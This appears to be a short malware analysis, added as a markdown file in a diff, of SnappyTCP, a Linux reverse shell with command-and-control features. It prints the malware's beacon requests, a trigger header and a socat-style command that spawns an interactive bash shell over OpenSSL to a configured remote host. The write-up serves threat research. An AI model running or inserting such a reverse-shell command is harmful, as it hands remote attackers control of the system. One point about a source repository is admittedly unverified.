@@ -1,0 +1,24 @@
+Gaslight Malware analysis AKA SnappyTCP
+
+SnappyTCP is a reverse TCP shell specifically designed for Linux/Unix systems, equipped with Command-and-Control (C2) capabilities. 
+
+1.	Purpose and Use: Hackers use SnappyTCP to exploit vulnerabilities in Linux or Unix systems, allowing them to gain unauthorized remote access. This access facilitates various illicit activities such as executing commands, exfiltrating data, and compromising system security.
+
+2.	Operation: SnappyTCP operates by establishing a TCP reverse shell, which creates a communication channel between the infected system and a hacker-controlled server. This channel is used to transmit commands and retrieve data.
+
+3.	Command Execution and Communication: After gaining access, the attackers run a script named upxa.sh to communicate with a controlled server.
+
+4.	Variant Operations: One variant of SnappyTCP secures connections using OpenSSL over TLS. Another variant operates by sending cleartext requests.
+
+5.	Non-TLS Variant Execution: This variant reads a conf file, extracts an IP from the first 256 bytes, and connects via a TCP socket. The command used for this connection is: GET /sy.php HTTP/1.1\r\nHost: %s\r\nHostname: %s\r\n\r\n, where %s is replaced with the host name. It listens for specific HTTP request patterns (e.g., X-Auth-43245-S-20 and \r\n\r\n) to trigger the TCP reverse shell.
+
+6.	TLS Variant Execution: In cases where it uses OpenSSL and TLS certificates for a secure link, the malware connects to an IP from the conf file and sends a different command: GET /ssl.php HTTP/1.1\\r\\nHost: %s\\r\\nHostname: %s\\r\\nConnection: close\\r\\n\\r\\n.
+
+7.	Spawning a Thread: The malware spawns a pthread calling bash to execute a different file (named update): bash -c \\"./update exec:'bash -li',pty,stderr,setsid,sigint,sane OPENSSL:%s:%d,verify=0 2>&1>/dev/null&\\".
+
+8.	Binary and Toolchain Usage: SnappyTCP binaries use various toolchains, and GLIBC is statically linked, which allows for self-contained operation without dependency on the target machine’s library files.
+
+9.	Malware Evolution and GitHub Repository: The GitHub repository of Teal Kurma shows the reverse TCP shell mirroring public code with update replacing connector. Other samples in the repository are also set up to establish reverse shells, I am unable to find the specific repository.
+
+
+With its Command-and-Control (C2) capabilities, SnappyTCP can maintain persistence on a compromised system, allowing continuous monitoring and further exploitation. This makes it challenging to detect and remove the malware, leading to prolonged exposure to threats.
